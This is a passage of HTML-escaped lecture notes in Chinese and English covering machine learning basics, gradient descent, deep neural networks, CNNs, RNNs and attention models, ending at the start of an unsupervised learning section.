&lt;li&gt;Loss Funciton  &lt;ul&gt;
&lt;li&gt;output 分數低，代表 loss 少，所以比較好。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;找出表現最好的 Loss Function  &lt;ul&gt;
&lt;li&gt;利用 Gradient Descent 來找  &lt;ul&gt;
&lt;li&gt;縱軸為 L 的 output，橫軸為 w  &lt;/li&gt;
&lt;li&gt;L 對 w 偏微分，取得其切線斜率  &lt;/li&gt;
&lt;li&gt;切線斜率為負時，增加 w，來取得較低的 L output  &lt;/li&gt;
&lt;li&gt;切線斜率為正時，減少 w，來取得較低的 L output  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;非 Linear 的話，會出現 Local optimal 和 Global optimal 的狀況  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;得到 Model  &lt;/li&gt;
&lt;li&gt;Model Generalization  &lt;ul&gt;
&lt;li&gt;嘗試不同的 Model  &lt;/li&gt;
&lt;li&gt;太過複雜的 Model 會出現 Overfitting 的狀況  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;Classification&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;分類  &lt;ul&gt;
&lt;li&gt;Binary Classification  &lt;ul&gt;
&lt;li&gt;Yes/No  &lt;/li&gt;
&lt;li&gt;Example  &lt;ul&gt;
&lt;li&gt;Spam Filtering  &lt;ul&gt;
&lt;li&gt;把 email 裡面的詞都當作一個 feature，透過 trained model 來得到 Boolean 的結果。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Multi-Class Classification  &lt;ul&gt;
&lt;li&gt;判斷是哪個種類  &lt;/li&gt;
&lt;li&gt;Example  &lt;ul&gt;
&lt;li&gt;餵入圖片，判斷是哪種動物  &lt;/li&gt;
&lt;li&gt;判斷新聞是屬於哪一種主題  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;Introduction to ML &amp;amp; DL&lt;/h1&gt;
&lt;h2&gt;Basic Deep Learning&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Stacked function learned by machine  &lt;/li&gt;
&lt;li&gt;Deep Learning 三步驟  &lt;ul&gt;
&lt;li&gt;Define a set of function  &lt;/li&gt;
&lt;li&gt;Godness of function  &lt;/li&gt;
&lt;li&gt;pick the best function  &lt;/li&gt;
&lt;li&gt;(和 ML 很像）  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;Step 1: Define a set of function&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Neural Network  &lt;ul&gt;
&lt;li&gt;Neuron: input, weights, bias, Activation function  &lt;/li&gt;
&lt;li&gt;將多個 Neuron 組合在一起，形成 Neuron Network  &lt;/li&gt;
&lt;li&gt;愈多層的話需要調整的參數越多  &lt;/li&gt;
&lt;li&gt;不同的 Connections 可以形成不同的 Neural Network  &lt;ul&gt;
&lt;li&gt;Fully-Connected Feedforward Network  &lt;ul&gt;
&lt;li&gt;每一個 Neuron 都跟前一個相連，會一直把數值傳下去。  &lt;/li&gt;
&lt;li&gt;Input Layer + Hidden Layers + Output Layer  &lt;/li&gt;
&lt;li&gt;"Deep" means multiple hidden layers  &lt;ul&gt;
&lt;li&gt;DNN 的 hidden layers 至少要大於 2  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Why Deep?  &lt;ul&gt;
&lt;li&gt;Fat + Shallow vs Thin + Deep  &lt;ul&gt;
&lt;li&gt;在數學上被證明是可以用一層很寬的 layer 來取代多層的 layers，但為什麼不用？  &lt;/li&gt;
&lt;li&gt;因為只用一層的話會需要使用到更多的 Neurons。（可以用類似 Logic Gates 簡化的方式來想）  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Examples  &lt;ul&gt;
&lt;li&gt;AlexNet (2012): 8 layers, 16.4%  &lt;/li&gt;
&lt;li&gt;VGG (2014): 19 layers, 7.3%  &lt;/li&gt;
&lt;li&gt;GoogleNet (2014): 22 layers, 6.7%  &lt;/li&gt;
&lt;li&gt;Residual Net (2015): 152 layers, 3.57%  &lt;ul&gt;
&lt;li&gt;人類自己把所有的 training data 看完後下去做測試，error rate 大概是 4~5%  &lt;/li&gt;
&lt;li&gt;首度超越人類  &lt;/li&gt;
&lt;li&gt;因為疊了很多層，所以可能有些資訊會在傳遞中遺失，所以使用了 Special structure，會把一些一開始就學到的很重要 information 直接保留下來，確保不會在傳遞過程中遺失。  &lt;/li&gt;
&lt;li&gt;使用 Softmax layer 來當 Output layer  &lt;ul&gt;
&lt;li&gt;可以對 output 的數值做 normalize，直接以機率的方式呈現結果。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Example  &lt;ul&gt;
&lt;li&gt;Handwriting Digit Recognition  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Input =&amp;gt; Neuron Network =&amp;gt; Output  &lt;/li&gt;
&lt;li&gt;Neuron Network =&amp;gt; A function set containing the candidates  &lt;/li&gt;
&lt;li&gt;FAQ  &lt;ul&gt;
&lt;li&gt;要用幾層？每層要用多少 Neuron？  &lt;ul&gt;
&lt;li&gt;試誤 + 直覺  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;我們可以自己設計 neuron network structure 嗎？  &lt;ul&gt;
&lt;li&gt;有很多不同的結構可以選擇  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;有辦法讓程式自動幫我們決定要使用哪種 structure  &lt;ul&gt;
&lt;li&gt;有，但還沒有被研究的非常透徹。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;Step 2: goodness of function&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Loss  &lt;ul&gt;
&lt;li&gt;A good function should make the loss of all examples as small as possible.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Total Loss  &lt;ul&gt;
&lt;li&gt;As small as possible  &lt;/li&gt;
&lt;li&gt;Find a function in function set that minimizes total loss  &lt;/li&gt;
&lt;li&gt;Find the network parameter &lt;code&gt;θ*&lt;/code&gt; that minimize total loss  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;Step 3: pick the best function&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Gradient Descent  &lt;ul&gt;
&lt;li&gt;Local minima  &lt;ul&gt;
&lt;li&gt;Very slow at the plateau  &lt;/li&gt;
&lt;li&gt;Stuck at saddle point  &lt;/li&gt;
&lt;li&gt;Stuck at local minima  &lt;/li&gt;
&lt;li&gt;Gradient descent never guarantee global minima  &lt;ul&gt;
&lt;li&gt;Use different &amp;amp; random initial point to reach different minima  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Even AlphaGo using this approach  &lt;ul&gt;
&lt;li&gt;其實 AI 並沒有那麼厲害，他們也是像探索戰爭迷霧那樣，一步一步去探索和嘗試的。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Deep Learning Toolkit&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Backpropagation  &lt;ul&gt;
&lt;li&gt;An efficient way to compute &lt;code&gt;∂L/∂w&lt;/code&gt; in neural network  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Frameworks  &lt;ul&gt;
&lt;li&gt;TensorFlow  &lt;ul&gt;
&lt;li&gt;比較多人在用且資料比較多  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Torch  &lt;/li&gt;
&lt;li&gt;Pytorch  &lt;ul&gt;
&lt;li&gt;比較多人在用且資料比較多  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Theano  &lt;ul&gt;
&lt;li&gt;AlexNet 的作者  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Microsoft CNTK  &lt;/li&gt;
&lt;li&gt;Caffe  &lt;/li&gt;
&lt;li&gt;DSSTNE  &lt;/li&gt;
&lt;li&gt;mxnet  &lt;/li&gt;
&lt;li&gt;Chainer  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;有 input 和 output，就可以使用這些工具幫你找尋合適的 Function Set  &lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;Keras&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;TensorFlow 和 Theano 的 Wrapper  &lt;/li&gt;
&lt;li&gt;非常容易寫  &lt;/li&gt;
&lt;li&gt;雖然可以細部調整的地方沒有直接使用 TensorFlow 和 Theano 來的多，但有足夠的彈性做一些調整。  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Learning Recipe&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;在 Training Data 上的表現好嗎？  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;不好  &lt;ul&gt;
&lt;li&gt;重新 train  &lt;/li&gt;
&lt;li&gt;可能原因  &lt;ul&gt;
&lt;li&gt;no good function exists: bad hypothesis function set =&amp;gt; reconstruct the model architecture  &lt;/li&gt;
&lt;li&gt;cannot find a good function: local optima =&amp;gt; change the training strategy  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;在 Testing Data 上的表現好嗎？  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;不好的話就是 Overfitting，要重新 train model  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Overfitting&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;High variance  &lt;/li&gt;
&lt;li&gt;可能的解法  &lt;ul&gt;
&lt;li&gt;more training samples  &lt;/li&gt;
&lt;li&gt;dropout  &lt;ul&gt;
&lt;li&gt;每次 random 讓數個 node 不工作  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;降維  &lt;ul&gt;
&lt;li&gt;PCA  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Concluding Remarks&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;3 steps of Basic Machine Learning 很重要  &lt;/li&gt;
&lt;li&gt;Stacked functions  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;Part II: Variants of Neural Nets&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Convolutional Neural Network (CNN)  &lt;/li&gt;
&lt;li&gt;Recurrent Neural Network (RNN)  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Convolutional Neural Network (CNN)&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;在影像處理上被廣泛使用  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Why CNN for Image?&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Some patterns are much smaller than the whole image.  &lt;ul&gt;
&lt;li&gt;A neuron does not have to see the whole image to discover pattern.  &lt;/li&gt;
&lt;li&gt;Connecting to small region with less parameters.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;The same patterns appear in different regions.  &lt;/li&gt;
&lt;li&gt;Subsampling the pixels will not change the object.  &lt;ul&gt;
&lt;li&gt;算是處理 image 上獨有的特性  &lt;/li&gt;
&lt;li&gt;We can subsmaple the pixel to make image smaller  &lt;ul&gt;
&lt;li&gt;Less parameters for the network to process the image  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;The Whole CNN&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Image =&amp;gt; &lt;code&gt;{Convolution =&amp;gt; Max Pooling}*N&lt;/code&gt; =&amp;gt; Flatten =&amp;gt; Fully Connected Feedforward Network  &lt;/li&gt;
&lt;li&gt;特性  &lt;ul&gt;
&lt;li&gt;和 Convolution 有關  &lt;ul&gt;
&lt;li&gt;Some patterns are much smaller than the whole image.  &lt;/li&gt;
&lt;li&gt;The same patterns appear in different regions.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;和 Max Pooling 有關  &lt;ul&gt;
&lt;li&gt;Subsampling the pixels will not change the object  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Image Recognition&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Local Connectivity  &lt;ul&gt;
&lt;li&gt;Neurons connected to a small region  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Parameter Sharing  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The same feature in different positions  &lt;ul&gt;
&lt;li&gt;Neurons share the same weights  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Different features in the same position  &lt;ul&gt;
&lt;li&gt;Neurons have different weights  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Convolutional Layers  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;Hyper-parameters of CNN  &lt;ul&gt;
&lt;li&gt;Stride  &lt;ul&gt;
&lt;li&gt;要隔多少去算下一個 information  &lt;/li&gt;
&lt;li&gt;如果覺得這張圖上的 information 是非常鬆散的，那 stride 就可以設高一點，讓他多隔幾層再去找 pattern  &lt;/li&gt;
&lt;li&gt;如果覺得這張圖上的 information 是非常緊密的，那 stride 就只能設低一點。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Padding  &lt;ul&gt;
&lt;li&gt;讓每一層的數值不要減少的太快  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Pooling Layer  &lt;ul&gt;
&lt;li&gt;Max Pooling  &lt;ul&gt;
&lt;li&gt;把最大的值保存下來  &lt;/li&gt;
&lt;li&gt;Image processing 比較常使用 Max Pooling  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Average Pooling  &lt;ul&gt;
&lt;li&gt;把平均的數值保存下來  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;壓縮資訊，減少下一層需要參數的量，使其更有效率。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Why Deep Learing works for image recogniton?  &lt;ul&gt;
&lt;li&gt;每個 node 會學習一些簡單的筆劃，組合起來後才會變成一個字。  &lt;/li&gt;
&lt;li&gt;愈前面的結果會愈簡單和基本，可能只是些筆劃，經過 Convolution 和 Max Pooling 後，可以用被壓縮後的較少資訊學習比較抽象的組合。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Fully-Connected Layer  &lt;ul&gt;
&lt;li&gt;Global feature extraction  &lt;/li&gt;
&lt;li&gt;Softmax Layer: Classifier  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;What CNN Learned  &lt;ul&gt;
&lt;li&gt;[AlexNet]  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;DNN are easily fooled  &lt;ul&gt;
&lt;li&gt;可以捏造一些奇怪的 input，看起來只是一些 noise，因為 DNN 會特別著重某些 pattern，所以會將這些圖誤判為目標物。  &lt;/li&gt;
&lt;li&gt;滿多資安的論文現在在探討攻擊 DNN 的手法。  &lt;/li&gt;
&lt;li&gt;Visualizing CNN  &lt;ul&gt;
&lt;li&gt;調整 noise 的 input，使其 filter response 更接近目標物的 filter response，有點像是反過來的 training  &lt;/li&gt;
&lt;li&gt;透過 Gradient Ascent 去微調  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://deepdreamgenerator.com/"&gt;https://deepdreamgenerator.com/&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Deep Style  &lt;ul&gt;
&lt;li&gt;一張圖保留 Content  &lt;/li&gt;
&lt;li&gt;另一張圖保留 Style  &lt;/li&gt;
&lt;li&gt;然後去調整保留 Content 的那張圖，並使用另一張圖的 Style  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Go Playing （下圍棋）  &lt;ul&gt;
&lt;li&gt;Conditions  &lt;ul&gt;
&lt;li&gt;Input: 目前棋盤的狀況  &lt;/li&gt;
&lt;li&gt;Output: 下一步應該下哪裡？  &lt;/li&gt;
&lt;li&gt;19x19 vector  &lt;/li&gt;
&lt;li&gt;black = 1, white = -1, none = 0  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Fully-Connected Feedforward Network could be used, but why CNN?  &lt;ul&gt;
&lt;li&gt;Some patterns are much smaller than the whole image  &lt;ul&gt;
&lt;li&gt;棋譜會有一些固定的 pattern  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;The same patterns appear in different regions  &lt;ul&gt;
&lt;li&gt;同樣的 pattern 有可能出現在棋盤上不同的地方  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Subsampling the pixels will not change the object  &lt;ul&gt;
&lt;li&gt;把棋譜作 subsampling 會讓整個棋譜的結果失真  &lt;/li&gt;
&lt;li&gt;因為 Subsampling 只和 Max Pooling Layer 有關，所以在 AlphaGo 的論文中有提到只有使用 Convolutional Layer，把 Max Pooling Layer 拿掉了。  &lt;/li&gt;
&lt;li&gt;如果不是很熟悉下圍棋以及 DNN 的 domain knowledge 的話，直接拿 CNN 去做是訓練不出什麼結果的，這也是為什麼 Alpha Go 會需要像黃士傑博士這樣會下圍棋又懂 Machine Learning 的人。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Recurrent Neural Network (RNN)&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Example Application  &lt;ul&gt;
&lt;li&gt;Slot Filling  &lt;ul&gt;
&lt;li&gt;Solved by Feedforward Network?  &lt;ul&gt;
&lt;li&gt;Input: a word  &lt;/li&gt;
&lt;li&gt;Output: probability distribution that the input word belonging to the slots  &lt;/li&gt;
&lt;li&gt;Problem  &lt;ul&gt;
&lt;li&gt;Arrive Taipei on November 2nd  &lt;ul&gt;
&lt;li&gt;Taipei 是目的地  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Leave Taipei on November 2nd  &lt;ul&gt;
&lt;li&gt;Taipei 是出發地  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;用 RNN 來解決  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;One-Hot Vector  &lt;ul&gt;
&lt;li&gt;1-of-N Encoding  &lt;/li&gt;
&lt;li&gt;有 N 個詞就用 N 維的矩陣來表示，如果該字有出現的話值就是 1，其他值就會是 0。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;RNN  &lt;ul&gt;
&lt;li&gt;The output of hidden layer are stored in the memory  &lt;/li&gt;
&lt;li&gt;Memory can be considered as another input  &lt;/li&gt;
&lt;li&gt;每一層都是拿現在看到的資訊和上一層的 memory 當成 input  &lt;/li&gt;
&lt;li&gt;不會因為層數比較多（語句比較長）就導致參數變多，參數的數量都是一樣的。  &lt;/li&gt;
&lt;li&gt;存在 memory 的 value 會影響最終的 prediction  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Deep RNN: 多層  &lt;/li&gt;
&lt;li&gt;Why use RNN in language processing?  &lt;ul&gt;
&lt;li&gt;因為語言是有時間順序的  &lt;/li&gt;
&lt;li&gt;如果 input 是時間順序非常重要的話，就可以考慮用 RNN 來做。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Bidirectional RNN  &lt;ul&gt;
&lt;li&gt;將 input 反向來作並加入 memory  &lt;/li&gt;
&lt;li&gt;缺點是會比較費時  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Learning Target  &lt;ul&gt;
&lt;li&gt;會比較複雜一些  &lt;/li&gt;
&lt;li&gt;一句話有五個詞，訓練一句話等於要拿到 5 個 targets  &lt;ul&gt;
&lt;li&gt;因為要判斷每個詞的 label  &lt;/li&gt;
&lt;li&gt;因為彼此是有順序相依性的，所以 loss 會是每層 layer 相加  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Training Difficulty - Rough Error Surface  &lt;ul&gt;
&lt;li&gt;The error surface is either very flat or very steep  &lt;ul&gt;
&lt;li&gt;非常難學習  &lt;/li&gt;
&lt;li&gt;所以會有一些各式各樣的小技巧出現在 RNN 裏面  &lt;ul&gt;
&lt;li&gt;Clipping  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Large &lt;code&gt;δL/δw&lt;/code&gt; =&amp;gt; Large Learning rate  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Many-to-One  &lt;ul&gt;
&lt;li&gt;Input is a vector sequence, but output is only one vector  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Many-to-Many (Output is shorter)  &lt;ul&gt;
&lt;li&gt;Both input and output are sequences, but the output is shorter  &lt;/li&gt;
&lt;li&gt;E.g. Speech Recognition  &lt;ul&gt;
&lt;li&gt;Input: vector sequence  &lt;/li&gt;
&lt;li&gt;Output: character sequence  &lt;/li&gt;
&lt;li&gt;Connectionist Temporal Classification (CTC)  &lt;ul&gt;
&lt;li&gt;加了一個額外的 symble &lt;code&gt;ϕ&lt;/code&gt; 來代表 Null  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;好好好棒棒棒棒&lt;/code&gt; vs &lt;code&gt;好ϕϕ棒ϕϕ棒&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;這樣就可以知道到底是一個棒還是兩個棒  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Many-to-Many (Output is no limitation)  &lt;ul&gt;
&lt;li&gt;Both input and output are sequences with different lengths  &lt;ul&gt;
&lt;li&gt;Sequence to sequence learning  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;E.g. Machine Translation  &lt;ul&gt;
&lt;li&gt;"Machine Learning" =&amp;gt; "機器學習"  &lt;/li&gt;
&lt;li&gt;Problem: Don't know when to stop  &lt;ul&gt;
&lt;li&gt;加上一個代表斷句或結尾的符號  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Image Caption Generation  &lt;ul&gt;
&lt;li&gt;給一張圖，描述出圖裏面有什麼  &lt;/li&gt;
&lt;li&gt;將圖餵給 CNN 後，會產出一個代表整章圖的 vector  &lt;/li&gt;
&lt;li&gt;將 vector 餵給 RNN  &lt;/li&gt;
&lt;li&gt;Example  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.captionbot.ai/"&gt;http://www.captionbot.ai/&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Video Caption Generation  &lt;ul&gt;
&lt;li&gt;每一個 Video 用 CNN  &lt;/li&gt;
&lt;li&gt;Video 裡面的每一張 Image 用 RNN  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Chit-Chat Bot  &lt;ul&gt;
&lt;li&gt;拿對話中其中一方的話當 input，另一方的話當 output 去訓練。  &lt;/li&gt;
&lt;li&gt;比較常用到 &lt;a href="https://en.wikipedia.org/wiki/Long_short-term_memory"&gt;LSTM&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://colah.github.io/posts/2015-08-Understanding-LSTMs/"&gt;http://colah.github.io/posts/2015-08-Understanding-LSTMs/&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Sci-Fi Short Film generated by AI - SUNSPRING  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=LY7x2lhqj"&gt;https://www.youtube.com/watch?v=LY7x2lhqj&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Attention and Memory  &lt;ul&gt;
&lt;li&gt;Question =&amp;gt; Organize =&amp;gt; Answer  &lt;ul&gt;
&lt;li&gt;被稱做 Attention  &lt;/li&gt;
&lt;li&gt;只會拿有用的資訊出來回答  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Attention on Sensory Info  &lt;ul&gt;
&lt;li&gt;Info from the sensors =&amp;gt; Sensory Memory == Attention ==&amp;gt; Working Memeory == Encode ==&amp;gt; Long-term Memory  &lt;/li&gt;
&lt;li&gt;Logn-term Memory == Retrieval ==&amp;gt; Working Memory  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Machine Translation with Attention  &lt;ul&gt;
&lt;li&gt;Keyword: "Attentional sequence to sequence model"  &lt;/li&gt;
&lt;li&gt;先用 match 判斷跟哪一塊的相似程度最高  &lt;/li&gt;
&lt;li&gt;目前 Google Translation 就是用這個 model 實現的  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Speech Recognition with Attention  &lt;ul&gt;
&lt;li&gt;比較深色的地方就是 Attention 比較高的部份  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Image Captioning with Attention  &lt;ul&gt;
&lt;li&gt;從錯誤的 prediction 中去瞭解判斷錯誤的可能原因  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Video Captioning with Attention  &lt;/li&gt;
&lt;li&gt;Reading Comprehension  &lt;ul&gt;
&lt;li&gt;Document =&amp;gt; 被切分成不同的詞被當作 feature  &lt;/li&gt;
&lt;li&gt;Question == RNN ==&amp;gt; q vector  &lt;/li&gt;
&lt;li&gt;根據 q vector 去決定哪一個句子最相關，再放入 DNN 裡頭去回答  &lt;/li&gt;
&lt;li&gt;Hopping  &lt;ul&gt;
&lt;li&gt;Memory Network  &lt;ul&gt;
&lt;li&gt;有可能第一次得到的結果不夠準確  &lt;/li&gt;
&lt;li&gt;用抽取出來資訊再做一次 Attention，再得到新的 information 並把它抽取出來。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;When the input is a very long sequence or an image  &lt;ul&gt;
&lt;li&gt;Pay attention on partial of the input object each time  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;In RNN/LSTM, larger memory implies more parameters  &lt;ul&gt;
&lt;li&gt;Increasing memory size will not increasing parameters  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Neural Turing Machine  &lt;ul&gt;
&lt;li&gt;an advanced RNN/LSTM  &lt;/li&gt;
&lt;li&gt;把 Long-term Memory 裡頭的資訊 retrieve 出來  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;Part III: Beyond Supervised Learning &amp;amp; Recent Trends (Unsupervised Learning)&lt;/h1&gt;
&lt;h2&gt;Introduction&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Big data != Big annotated data  &lt;ul&gt;
&lt;li&gt;What can we do if there is no sufficient labelled training data?  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
